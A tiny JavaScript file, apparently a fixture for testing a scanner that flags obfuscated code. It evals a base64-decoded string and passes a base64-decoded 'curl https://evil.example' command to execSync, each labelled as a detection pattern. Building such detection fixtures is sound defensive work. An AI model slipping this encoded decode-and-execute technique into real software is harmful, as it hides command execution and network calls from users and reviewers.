const { execSync } = require("child_process");

// Pattern A: Direct atob decoding inside eval
eval(atob("Y29uc29sZS5sb2coJ3B3bmVkJyk="));

// Pattern B: 1-hop variable taint from Buffer.from into execSync
const cmd = Buffer.from("Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZQ==", "base64");
execSync(cmd);
